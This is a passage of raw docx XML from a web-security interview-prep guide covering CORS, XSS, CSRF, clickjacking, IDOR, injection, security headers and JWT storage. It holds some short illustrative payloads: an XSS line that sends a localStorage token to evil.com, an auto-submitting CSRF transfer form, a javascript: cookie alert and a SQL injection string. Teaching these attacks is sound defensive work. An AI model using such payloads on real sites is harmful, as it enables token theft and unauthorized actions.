                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>OPTIONS /api/calls   Origin: https://app.bpobox.com</w:t>
              <w:br/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>← Access-Control-Allow-Origin: https://app.bpobox.com</w:t>
              <w:br/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>← Access-Control-Allow-Credentials: true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"CORS is the server telling the browser which other origins may read its responses."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Q10. Is CORS a security feature for your API?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No. It protects users' browsers, not your API; curl and scripts ignore it.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Explanation:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> Every endpoint still needs authentication and authorisation.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Example:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> A strict CORS policy doesn't stop </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="B42318"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>curl -H "Cookie: …" https://api/…</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> at all.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Say it like this:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> "CORS is a browser rule, not an API firewall."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Q11. What are the REST principles?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Resource URLs, standard methods, stateless requests, JSON representations, correct status codes and cacheability.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Explanation:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> Following them makes APIs predictable and lets HTTP caching work.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GET /calls/42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PATCH /calls/42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DELETE /calls/42</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t>, with 200, 204 and 404 as appropriate.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Say it like this:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> "REST is about predictable resources and verbs, which makes clients simple."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Q12. REST vs GraphQL vs gRPC?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REST is simple with HTTP caching; GraphQL lets clients pick fields from one endpoint; gRPC is fast binary service-to-service.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Explanation:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> GraphQL avoids over- and under-fetching but needs query limits and different caching; gRPC needs gRPC-Web for browsers.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Example:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> The airline site used GraphQL to fetch exactly the fields each widget needed from many services.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Say it like this:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> "REST by default, GraphQL when UIs aggregate many sources, gRPC between services."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Q13. What are the options for real-time communication?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Short polling, long polling, SSE, WebSocket and WebRTC.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Explanation:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> Choose by direction, frequency, latency and infrastructure.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Example:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> Notifications via SSE, chat via WebSocket, video via WebRTC.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Say it like this:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> "I pick the simplest transport that fits the direction and latency the feature needs."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Q14. SSE vs WebSocket: when do you use each?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SSE for one-way server-to-client streams; WebSocket for two-way interactive features.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Explanation:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> SSE works over normal HTTP and reconnects automatically; WebSocket needs connection management.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Example:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> The AI compliance chat streams tokens over SSE; the question is a normal POST.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Say it like this:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> "For the compliance chat SSE was enough: tokens flow one way, and WebSocket would add complexity for nothing."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Q15. Authentication vs authorisation?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Authentication verifies who you are; authorisation decides what you can do.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Explanation:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> Both are needed on every request: a valid user can still be unauthorised for a resource.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Example:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> Logged in as a QA reviewer (authenticated) but blocked from tenant settings (not authorised).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Say it like this:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> "AuthN is identity, AuthZ is permission, and the server checks both every time."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🟡 Level 2 — Intermediate: Common Attacks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Q16. What is XSS, what types are there, and what's the impact?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Attacker JavaScript running in your page: stored, reflected or DOM-based.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Explanation:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> The script can do anything the user can: read data on screen, call APIs, log keystrokes and steal non-HttpOnly tokens.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HTML</w:t>
              <w:br/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>&lt;img src=x onerror="fetch('https://evil.com?c='+localStorage.token)"&gt;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"XSS means the attacker's code runs as the user, so it's one of the most serious frontend bugs."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Q17. How do you defend against XSS?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Escape output by default, avoid dangerous sinks, sanitise required HTML, add a CSP and Trusted Types, keep tokens in HttpOnly cookies, and validate URLs.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Explanation:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> Defence in depth: if one layer fails, CSP stops injected scripts running or sending data out.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&lt;div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(html) }} /&gt;</w:t>
              <w:br/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>const safeHref = (u: string) =&gt; { try { return ['https:', 'http:'].includes(new URL(u).protocol) ? u : '#'; } catch { return '#'; } };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"React escapes text, so I focus on escape hatches, and a strict CSP is the safety net."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Q18. Where can XSS still happen in React?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dangerouslySetInnerHTML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javascript:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> URLs in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="B42318"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>href</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve">, unsanitised markdown or LLM output, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="B42318"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>innerHTML</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> via refs, third-party widgets, and unescaped JSON in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="B42318"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>&lt;script&gt;</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> tags.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Explanation:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> Each bypasses React's automatic escaping.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&lt;a href={user.website}&gt;</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> with </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="B42318"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>javascript:alert(document.cookie)</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> runs on click.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Say it like this:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> "I audit every escape hatch, especially links and rendered markdown."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Q19. What is CSRF, and how do you defend against it?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Another site makes the user's browser send an authenticated request, because cookies are attached automatically.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Explanation:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> Defend with SameSite cookies, CSRF tokens, Origin checks, no state changes on GET, and re-authentication for sensitive actions.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HTML</w:t>
              <w:br/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>&lt;form action="https://bank.com/transfer" method="POST"&gt;&lt;input name="to" value="attacker"&gt;&lt;/form&gt;</w:t>
              <w:br/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>&lt;script&gt;document.forms[0].submit()&lt;/script&gt;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"CSRF abuses automatic cookies, so SameSite cookies plus Origin or token checks shut it down."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Q20. Does putting a JWT in the Authorization header prevent CSRF?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Yes, because headers aren't attached automatically, but the token must then be readable by JavaScript.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Explanation:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> You've traded CSRF risk for XSS token-theft risk.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Example:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> One XSS bug can read the token from memory or storage and use it from anywhere.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Say it like this:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> "Bearer headers solve CSRF but make XSS worse; there's no free lunch."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Q21. What is clickjacking?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Your page is loaded in an invisible iframe to trick users into clicking it.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Explanation:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> Prevent it with </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="B42318"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>frame-ancestors 'none'</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> in CSP (or </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="B42318"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>X-Frame-Options: DENY</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t>).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Example:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> A hidden "Delete account" button under a fake "Win a prize" button.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Say it like this:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> "</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="B42318"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>frame-ancestors</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> stops other sites framing our app, which kills clickjacking."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Q22. What is an open redirect?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redirect parameter that sends users to an attacker's site after login.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Explanation:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> The trusted domain makes phishing links believable. Allow only relative paths or an allowlist.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const next = searchParams.get('next') ?? '/';</w:t>
              <w:br/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>const safe = next.startsWith('/') &amp;&amp; !next.startsWith('//') ? next : '/';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"Redirect targets are validated so our domain can't be used to launch phishing."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Q23. What is IDOR, or broken access control?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Changing an ID in a request returns someone else's data because the server didn't check ownership or tenant.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Explanation:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> It's the top OWASP category. Authorise every request by user, tenant and ownership, with automated tests.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/api/calls/124</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> → </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="B42318"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>/api/calls/125</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> returns another team's recording.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Say it like this:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> "The UI may never show call 125's link, but the API must still reject it; missing tenant scoping was exactly this kind of finding in our audit."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Q24. What is injection (SQL, NoSQL, command)?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Untrusted input interpreted as code.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Explanation:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> Use parameterised queries or ORMs, validation and least-privilege DB users. Frontend validation is UX only.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WHERE name = '${input}'</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> with </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="B42318"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>' OR 1=1 --</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> returns every row; a parameterised query doesn't.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Say it like this:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> "Input is always data, never code: parameterised queries, validated on the server."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Q25. How does sensitive data get exposed by the frontend?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Secrets in bundles, verbose errors, data in URLs, sensitive data in localStorage, and public source maps.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Explanation:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> Anything shipped to the browser is public.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Example:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> An API key in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="B42318"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>NEXT_PUBLIC_API_KEY</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> is visible to anyone opening DevTools.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Say it like this:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> "I assume everything in the bundle, URL and storage is public, and design around that."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Q26. What's on the security headers checklist?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CSP, HSTS, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="B42318"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>X-Content-Type-Options: nosniff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Referrer-Policy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Permissions-Policy</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> and COOP.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Explanation:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> Each closes a specific class of attack with one header.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TEXT</w:t>
              <w:br/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Strict-Transport-Security: max-age=63072000; includeSubDomains; preload</w:t>
              <w:br/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>X-Content-Type-Options: nosniff</w:t>
              <w:br/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Referrer-Policy: strict-origin-when-cross-origin</w:t>
              <w:br/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Permissions-Policy: camera=(self), microphone=(self), geolocation=()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"A handful of headers give a lot of protection, so they're part of every deploy."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Q27. How do you protect against supply-chain attacks?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Lockfiles with </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="B42318"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>npm ci</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t>, dependency bots and audits, reviewing new packages, pinning critical ones, SRI for CDN scripts and few third-party scripts.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Explanation:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> Dependencies run with your app's full privileges.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Example:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> A new dependency with a postinstall script and one maintainer gets reviewed before adding.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Say it like this:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> "Every dependency is code we ship, so new ones get reviewed and all are scanned."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🟡 Intermediate: Authentication and Authorisation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Q28. Session cookies vs tokens (JWT)?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Sessions store state on the server with an opaque cookie and are easy to revoke; JWTs are self-contained and stateless but hard to revoke.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Explanation:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> Many systems combine short-lived JWT access tokens with server-tracked refresh tokens.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Example:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> Logging out a stolen session is one DB delete with sessions; with a 1-hour JWT it stays valid until expiry.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Say it like this:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> "Sessions win on revocation, JWTs on statelessness; short-lived JWTs plus revocable refresh tokens balance both."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Q29. What is the structure of a JWT, and how do you validate it?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header.payload.signature</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t>, base64url-encoded; signed, not encrypted.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Explanation:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> Validate the signature with the expected algorithm (reject </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="B42318"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>none</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve">), plus </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="B42318"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>exp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nbf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iss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aud</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t>. Keep the payload minimal, with no PHI.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TEXT</w:t>
              <w:br/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>{ "alg": "RS256" } . { "sub": "u_123", "role": "qa", "exp": 1730000000 } . &lt;signature&gt;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"Anyone can read a JWT, so it never contains sensitive data, and the server validates algorithm, expiry, issuer and audience."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Q30. Where should tokens be stored in a browser?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Not in localStorage; prefer HttpOnly cookies, memory plus an HttpOnly refresh cookie, or a BFF holding tokens.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Explanation:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="TableGrid"/>
        <w:tblW w:type="auto" w:w="0"/>
        <w:jc w:val="center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Option</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="332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If XSS happens</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="332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CSRF exposure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localStorage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token stolen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HttpOnly cookie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can't be read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needs SameSite/CSRF defence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Memory + refresh cookie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lost on reload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refresh endpoint needs CSRF defence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BFF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browser has only a session cookie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SameSite/CSRF defence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Example:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> InterpretIQ moved from localStorage JWTs to HttpOnly, Secure, SameSite cookies after the audit.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Say it like this:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> "For healthcare I'd use a BFF, so the browser only holds an HttpOnly session cookie and XSS can't take the session away."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Q31. What is refresh token rotation?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Each refresh issues a new refresh token and invalidates the old one; reuse of an old token revokes the whole family.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Explanation:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> It turns token theft into a detectable event.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Example:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> An attacker replays a stolen refresh token after the user already used it → server sees reuse → logs out both.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Say it like this:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> "Rotation makes a stolen refresh token single-use and detectable."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Q32. How do you handle token expiry when several requests run at once?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Make the refresh single-flight: the first 401 starts it, others wait on the same promise, each request retries once, and failure logs out.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
